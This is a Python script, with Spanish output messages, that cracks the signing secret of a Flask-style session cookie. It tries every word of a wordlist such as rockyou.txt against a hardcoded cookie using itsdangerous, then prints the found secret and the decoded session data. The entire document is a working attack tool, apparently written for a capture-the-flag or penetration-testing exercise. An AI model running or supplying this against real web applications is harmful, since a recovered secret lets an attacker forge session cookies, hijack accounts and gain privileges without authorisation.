#!/usr/bin/env python3
import sys
from itsdangerous import URLSafeTimedSerializer

cookie = "eJyrVirKz0lVslIqLU4tUtIBU_GZKUpWhiYQTl5iLkg6uzS7UqkWAGL8Dzg.aftt9Q.siHq5O5DOG2_gRSKA3wQO7bmB_A"

wordlist_file = sys.argv[1] if len(sys.argv) > 1 else "rockyou.txt"

print(f"[*] Crackeando con: {wordlist_file}")
try:
    with open(wordlist_file, "r", errors="ignore") as f:
        for i, line in enumerate(f):
            secret = line.strip()
            if not secret:
                continue
            try:
                s = URLSafeTimedSerializer(secret_key=secret, salt="cookie-session")
                data = s.loads(cookie, max_age=None)
                print(f"\n[+] SECRET ENCONTRADA: '{secret}'")
                print(f"[+] Datos: {data}")
                sys.exit(0)
            except Exception:
                pass
            if i % 10000 == 0:
                print(f"[*] Probadas {i} palabras... última: {secret}", end="\r")
    print("\n[-] No encontrada")
except FileNotFoundError:
    print(f"[-] Archivo {wordlist_file} no encontrado")